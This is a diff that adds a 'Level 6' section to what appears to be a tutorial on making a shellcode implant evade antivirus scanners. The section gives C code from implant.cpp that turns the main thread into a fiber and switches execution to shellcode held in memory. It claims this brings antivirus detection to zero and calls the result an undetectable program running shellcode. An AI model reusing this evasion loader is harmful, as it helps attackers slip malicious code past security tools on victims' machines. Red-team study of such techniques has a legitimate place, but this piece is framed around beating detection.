@@ -387,3 +387,37 @@ Adopting this, the analysis seems to be further lowered, bringing us even closer
 [**Antiscan Score: x/26**]()
 
 ![Level5 Analysis]()
+
+## Level 6 - Get your Fibers in!
+
+Finally, we try alternative methods to execute shell code using [Fibers](https://docs.microsoft.com/en-us/windows/win32/procthread/fibers), which is the minimal execution unit of a modern operating system. We convert the main thread running the program into a `Fiber` amd then create a new one from it and switch to the context of the newly created Fiber, much like what we used to do with threads. 
+
+```c
+/// In `implant.cpp`
+....
+// Convert main Thread to fiber
+th = _ConvertThreadToFiber(NULL);
+if(th == NULL){
+    // fprintf(stderr, "ConvertThreadToFiber failed!\n");
+    return -3;
+}
+....
+fiber = _CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
+if (fiber == NULL){
+    // fprintf(stderr, "CreateFiber Failed with error code: %d\n", GetLastError());
+    return -4;
+}
+
+_SwitchToFiber(fiber);
+....
+```
+
+Compiling with the usual intructions gives us our final executable.
+
+### Antiscan Analysis
+
+This seems to do wonders as it brings the detection rates to zero(atleast at the time of writing this) and I guess we can say that we now have an undetectable sus-looking-program running our shellcode.
+
+[**Antiscan Score: x/26**]()
+
+![Level5 Analysis]()
